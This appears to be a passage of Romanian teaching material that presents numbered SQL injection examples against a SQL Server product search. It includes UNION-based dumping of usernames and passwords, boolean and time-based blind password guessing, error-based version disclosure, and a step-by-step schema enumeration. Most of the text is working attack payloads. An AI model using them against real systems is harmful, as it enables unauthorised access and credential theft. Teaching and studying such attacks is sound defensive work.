-- ==== exemplul 4 ====
-- Input malițios în câmpul de căutare a produselor:
' UNION SELECT NULL, Username + ':' + Parola, NULL, NULL FROM Utilizatori --

-- Interogarea rezultantă:
SELECT Denumire, Descriere, Pret, Stoc
FROM Produse
WHERE Denumire LIKE '%' UNION SELECT NULL, Username + ':' + Parola, NULL, NULL
FROM Utilizatori --%'

-- ==== exemplul 5 ====
-- Atacatorul testează dacă prima literă a parolei admin-ului este 'a'
' OR (SELECT SUBSTRING(Parola, 1, 1) FROM Utilizatori
      WHERE Username = 'admin') = 'a' --

-- Dacă pagina afișează rezultate → prima literă este 'a'
-- Dacă nu afișează niciun rezultat → prima literă NU este 'a'
-- Atacatorul repetă pentru fiecare literă, fiecare poziție

-- ==== exemplul 6 ====
-- Sintaxă T-SQL (SQL Server): interogare „stivuită”, cu WAITFOR ca instrucțiune.
-- Dacă prima literă a parolei admin-ului este 'a', serverul așteaptă 5 secunde.
'; IF (SELECT SUBSTRING(Parola, 1, 1) FROM Utilizatori
       WHERE Username = 'admin') = 'a' WAITFOR DELAY '0:0:5' --

-- Atacatorul măsoară timpul de răspuns:
-- ~5 secunde → litera este 'a'
-- răspuns rapid → litera NU este 'a'

-- ==== exemplul 7 ====
-- Forțarea unei erori care dezvăluie versiunea SQL Server
' AND 1=CONVERT(int, @@version) --

-- Eroare: Conversion failed when converting the nvarchar value
-- 'Microsoft SQL Server 2025 (RTM) - 17.0.1000.7 ...' to data type int.

-- ==== exemplul 10 ====
-- Pas 1: numărul de coloane (ORDER BY progresiv)
' ORDER BY 1 --   (funcționează)
' ORDER BY 2 --   (funcționează)
' ORDER BY 3 --   (funcționează)
' ORDER BY 4 --   (eroare → interogarea are 3 coloane)

-- Pas 2: coloanele vizibile și compatibile cu text. NULL este compatibil
-- cu orice tip, deci se pornește de la NULL-uri și se pune pe rând un șir
-- pe fiecare poziție. Pe coloana numerică (a 3-a), un șir dă eroare de
-- conversie, deci acolo se lasă NULL.
' UNION SELECT 'aaa', 'bbb', NULL --
-- Atacatorul vede care dintre 'aaa' și 'bbb' apare pe pagină

-- Pas 3: numele tabelelor (pe coloane de tip text, restul NULL)
' UNION SELECT TABLE_NAME, NULL, NULL
  FROM INFORMATION_SCHEMA.TABLES --

-- Pas 4: coloanele dintr-un tabel
' UNION SELECT COLUMN_NAME, DATA_TYPE, NULL
  FROM INFORMATION_SCHEMA.COLUMNS
  WHERE TABLE_NAME = 'Utilizatori' --

-- Pas 5: extragerea datelor. Username și Parola (ambele text) se
-- concatenează pe o singură coloană text; poziția numerică rămâne NULL.
' UNION SELECT Username + ':' + Parola, NULL, NULL
  FROM Utilizatori --
